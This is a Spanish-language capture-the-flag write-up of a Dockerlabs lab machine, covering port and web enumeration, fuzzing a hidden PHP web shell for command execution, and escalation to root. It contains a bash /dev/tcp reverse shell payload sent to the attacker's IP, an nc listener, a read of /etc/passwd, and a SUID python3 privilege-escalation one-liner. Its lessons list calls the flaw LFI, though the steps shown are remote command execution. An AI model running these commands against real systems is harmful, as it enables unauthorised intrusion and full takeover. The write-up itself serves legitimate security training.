
# Writeup Template: Maquina `[ WalingDead ]`

- Tags: #WalkingDead
- Dificultad: `[ Facil ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina WalkingDead](https://mega.nz/file/KYF0CAia#VZDiYoAnlpQ1n61yLqOkFfCApsLeqOgPL9Hyoi8tzgM)  Laboratorio para practicar técnicas básicas de explotación en entornos web.

## Configuración del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x walking_dead.zip
sudo bash auto_deploy.sh walking_dead.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sC -sV -p22,80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```
---

## Enumeracion de [Servicio Web Principal]
Direccion URL del servicio:
```bash
http://172.17.0.2
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2
```

Reporte:
```bash
/hidden/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
```bash
/hidden/              (Status: 200) [Size: 739]
```

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,txt,sh,html,js
```

- **Hallazgos**:
```bash
/index.html           (Status: 200) [Size: 1380]
/backup.txt           (Status: 200) [Size: 53]
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Revisando el codigo fuente de la web princiipal:
```bash
http://172.17.0.2/
```

Vemos que esta llamando a un archivo oculto: **( shell.php )**
```bash
http://172.17.0.2/hidden/.shell.php
```
### Ejecucion del Ataque
Ahora que cargamos el archivo intentaremos fuzzear por el parametro al que este llamando:
```bash
# Comandos para explotación
ffuf -u http://172.17.0.2/hidden/.shell.php\?FUZZ\=whoami -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -fs 0
```

Tenemos el parametro y al probarlo es vulnerable a ejecucion remota de comandos:
### Intrusion
Modo escucha
```bash
nc -nlvp 443
```

```bash
# Reverse shell o acceso inicial
172.17.0.2/hidden/.shell.php?cmd=bash -c 'exec bash -i %26>/dev/tcp/172.17.0.1/443 <%261'
```

---
## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Comandos clave ejecutados
cat /etc/passwd
```

Revisando los usuarios del sistema vemos que tenemos:
```bash
rick:x:1000:1000::/home/rick:/bin/bash
negan:x:1001:1001::/home/negan:/bin/bash
```
### Explotacion de Privilegios

###### Usuario `[ www-data ]`:
Tenemos un binario **SUID** el cual podemos explotar
```bash
find / -perm -4000 2>/dev/null
```

```bash
/usr/bin/python3.8
```

Explotando el binario para elevar privilegios a **root**
```bash
# Comando para escalar al usuario: ( root )
/usr/bin/python3.8 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
```

---
## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
bash-5.0# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos a realizar la vulnerabilidad **LFI**
2. Aprendimos a **fuzzear** por sus parametros vulnerables para derivarlo a un **RCE**
3. Aprendimos a explotar el binario de **python3** para elevar privilegios a **root**

## Recomendaciones de Seguridad
- Sanitizar el parametro vulnerable en la consulta **php**
- No dar privilegios especiales **SUID** al binario de **python3**.